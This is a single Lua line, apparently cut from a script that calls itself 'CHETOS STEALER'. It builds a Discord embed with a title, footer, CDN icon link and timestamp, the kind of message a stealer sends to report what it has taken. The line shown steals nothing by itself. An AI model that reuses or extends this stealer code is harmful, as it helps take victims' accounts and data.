            local embed = {title = "ğŸ¾ **CHETOS STEALER PALDO**", color = 2829617, description = description, footer = { text = "CHETOS STEALER â€¢ by CHETOS Developer", icon_url = "https://cdn.discordapp.com/attachments/1399016886737436702/1399382949903994912/file_00000000a50461f88005f314f95f2088_1.png?ex=6888cc6e&is=68877aee&hm=1145895e352725b421360afb33316b7d725425032687bbbb3df182ce52e807b7&" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
